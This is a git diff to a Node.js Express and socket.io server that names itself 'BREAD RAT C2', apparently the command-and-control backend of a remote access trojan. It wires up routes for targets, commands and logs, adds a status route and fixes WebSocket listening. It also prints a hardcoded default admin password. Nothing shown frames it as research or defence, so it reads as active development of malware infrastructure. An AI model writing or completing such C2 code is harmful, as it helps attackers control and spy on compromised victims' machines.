@@ -5,8 +5,7 @@ const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
 const cors = require('cors');
-const path = require('path');
-const { initDatabase } = require('./routes/db');   // kita buat di routes/db.js (akan aku berikan)
+const { initDatabase } = require('./routes/db');
 const authRoutes = require('./routes/auth');
 const targetsRoutes = require('./routes/targets');
 const commandsRoutes = require('./routes/commands');
@@ -31,6 +30,11 @@ app.use('/api/targets', targetsRoutes);
 app.use('/api/commands', commandsRoutes);
 app.use('/api/logs', logsRoutes);
 
+// Root route untuk testing
+app.get('/', (req, res) => {
+    res.send('🍞 BREAD RAT C2 is running!');
+});
+
 // WebSocket
 socketHandler(io);
 
@@ -38,8 +42,10 @@ socketHandler(io);
 (async () => {
     await initDatabase();
     const PORT = process.env.PORT || 3000;
-    app.listen(PORT, '0.0.0.0', () => {
-        console.log(`Server running on port ${PORT}`);
+    server.listen(PORT, '0.0.0.0', () => {
+        console.log(`🍞 BREAD RAT C2 running on port ${PORT}`);
+        console.log(`📡 WebSocket path: /socket.io/update`);
+        console.log(`👤 Default login: admin / BreadRAT2025!`);
     });
 })();
 
